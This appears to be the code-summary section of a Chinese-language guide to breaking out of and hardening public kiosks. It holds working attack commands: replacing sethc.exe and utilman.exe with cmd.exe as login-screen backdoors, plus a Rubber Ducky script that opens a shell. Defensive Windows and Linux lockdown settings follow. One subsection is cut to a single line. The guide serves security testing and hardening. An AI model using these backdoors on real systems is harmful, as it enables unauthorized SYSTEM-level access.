## 六、代码汇总

### 6.1 Windows Kiosk 突破技术

```powershell
# 1. 利用 Sticky Keys 后门
# 在登录界面按 5 次 Shift 键触发 sethc.exe
# 如果 sethc.exe 被替换为 cmd.exe，将获得 SYSTEM shell

# 替换 sethc.exe (需要管理员权限)
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant administrators:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe

# 2. 利用 Utilman 后门
# 在登录界面点击辅助功能按钮触发 utilman.exe
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe

# 3. 利用文件对话框
# 在文件对话框的地址栏输入:
# C:\Windows\System32\cmd.exe
# 或右键 -> 打开方式 -> 选择程序
```

### 6.2 浏览器 Kiosk 突破

// 1. 利用 file:// 协议

### 6.4 Rubber Ducky 脚本

```
REM Windows Kiosk 突破脚本
DELAY 1000
REM 尝试打开运行对话框
GUI r
DELAY 500
STRING cmd.exe
ENTER
DELAY 500
REM 如果失败，尝试其他方法
GUI x
DELAY 200
STRING a
DELAY 500
STRING cmd
ENTER
```

### 6.5 Kiosk 安全配置 (Windows)

```powershell
# 1. 配置 Assigned Access
Set-AssignedAccess -AppUserModelId Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge -UserName KioskUser

# 2. 禁用快捷键
# 通过组策略禁用:
# User Configuration > Administrative Templates > Windows Components > File Explorer
# - Turn off Windows Key hotkeys

# 3. 限制应用
# 使用 AppLocker 或 WDAC

# 4. 禁用 USB
# 通过组策略或注册表:
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR" -Name "Start" -Value 4
```

### 6.6 Kiosk 安全配置 (Linux)

```bash
# 1. 创建受限用户
useradd -m -s /bin/rbash kiosk

# 2. 限制 PATH
echo 'PATH=/usr/local/kiosk/bin' >> /home/kiosk/.bashrc
echo 'export PATH' >> /home/kiosk/.bashrc

# 3. 使用 AppArmor
# /etc/apparmor.d/usr.bin.kiosk-app
profile kiosk-app /usr/bin/kiosk-app {
    # 只允许必要的访问
    /usr/bin/kiosk-app r,
    /tmp/** rw,
    deny /bin/** x,
    deny /usr/bin/** x,
}

# 4. 禁用 USB
echo 'blacklist usb-storage' >> /etc/modprobe.d/blacklist.conf
```

□ 尝试 USB 设备
□ 检查物理访问
